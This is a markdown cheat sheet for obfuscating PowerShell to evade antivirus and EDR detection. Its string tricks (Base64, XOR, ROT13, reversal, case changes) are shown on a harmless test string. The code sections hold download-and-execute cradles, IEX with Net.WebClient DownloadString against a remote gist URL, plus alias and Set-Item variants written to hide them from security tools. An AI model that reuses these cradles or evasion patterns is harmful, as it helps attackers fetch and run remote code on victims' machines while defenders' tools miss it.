<h1 align="center">
Powershell Obfuscation Cheat sheet for AV/EDRs Evasion
</h1>

**Table of Contents**
- [String Obfuscation](#String-Obfuscation)
  * [Alternating caps](#Alternating-caps)
  * [Replace](#Replace)
  * [Reverse-String](#Reverse-String)
  * [RightToLeft](#RightToLeft)
  * [HTMLEncode](#HTMLEncode)
  * [Base64](#Base64)
  * [XOR](#XOR)  
  * [ROT13](#ROT13)
- [Code Obfuscation](#Code-Obfuscation)
  * [Using SessionStateAliasEntry](#SessionStateAliasEntry)


### String-Obfuscation

#### Alternating-caps
```powershell
# Original 
SV("ENVIRONMENTVAR")([Type]("environment")); 

# Example
SV("ENVIRONMENTVAR")([TyPe]("ENVIronMENt")); 
```

#### Replace
```powershell
# Original 
write-host teststring

# Example
write-host (-Join ("te~~st~~str~~ing" -Split "~~"))
```

#### Reverse-String
```powershell
# Original 
write-host teststring

# Example
write-host (-Join "gnirtstset"[10..0]) # 10 is string length
```

#### RightToLeft
```powershell
# Original 
write-host teststring

# Example
write-host (-Join[RegEx]::Matches("gnirtstset",'.','RightToLeft'))
```

#### HTMLEncode
```powershell
# Original 
write-host "test  string"

# Example
write-host ([System.Web.HttpUtility]::HtmlDecode("test&nbsp;&nbsp;string"))
```

#### Base64
```powershell
# Original 
write-host teststring

# Example
write-host [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("dABlAHMAdABzAHQAcgBpAG4AZwA="))
```

#### XOR
```powershell
# Original 
write-host teststring

# Example
$key = "supersecret";
$ENC = @(7,16,3,17,1,7,23,10,28,2);
$DEC = @();
for ($i = 0; $i -lt $ENC.Count; $i++) {
    $DEC += $ENC[$i] -bxor $key[$i % $key.Length];
} 
write-host ([system.Text.Encoding]::UTF8.getString($DEC));  
```


#### ROT13
```powershell
# Original 
write-host teststring

# Example
$output = "";
"grfgfgevat".ToCharArray() | ForEach-Object {
    if((([int] $_ -ge 97) -and ([int] $_ -le 109)) -or (([int] $_ -ge 65) -and ([int] $_ -le 77)))
    {
        $output += [char] ([int] $_ + 13);
    }
    elseif((([int] $_ -ge 110) -and ([int] $_ -le 122)) -or (([int] $_ -ge 78) -and ([int] $_ -le 90)))
    {
        $output += [char] ([int] $_ - 13);
    }
    else
    {
        $output += $_
    }        
}
write-host $output
```

### Code-Obfuscation

#### SessionStateAliasEntry
you can use Built-In Aliases in powershell you can access the entire list from here 
[src/System.Management.Automation/engine/InitialSessionState.cs#L4586](https://github.com/PowerShell/PowerShell/blob/a99ea2acd2ac4b979974719d514d6c421fdcbdee/src/System.Management.Automation/engine/InitialSessionState.cs#L4586)
```powershell
# the following code will pop up calc
$site='https://gist.githubusercontent.com/WazeHell/c1937b0ca35b0ad4f81523c5efef6750/raw/4c03e65360e338ba4b741a1dd2dea4dc3f370e65/justtest.html';

# Original 
Set-Alias -Name MoreObject -Value new-object
Set-Alias -Name thissmtelse -Value iex
thissmtelse((MoreObject(('Net.Webclient'))).(('Downloadstring')).InVokE((($site))))

# Example
sal MoreObject new-object;
sal thissmtelse iex;
thissmtelse((MoreObject(('Net.Webclient'))).(('Downloadstring')).InVokE((($site))))
```

#### Set-Item AND Get-Item
```powershell
# the following code will pop up calc
$site='https://gist.githubusercontent.com/WazeHell/c1937b0ca35b0ad4f81523c5efef6750/raw/4c03e65360e338ba4b741a1dd2dea4dc3f370e65/justtest.html';

# Original 
IEX((new-object net.webclient).downloadstring($site))

# Example
si('variable:eegw')([string]('new-object'));
si('variable:eeg')([string]('iex'));
sal MoreObject (gv('eegw')).Value;
sal thissmtelse (gv('eeg')).Value;
thissmtelse((MoreObject(('Net.Webclient'))).(('Downloadstring'))."InVokE"((($site))))
```


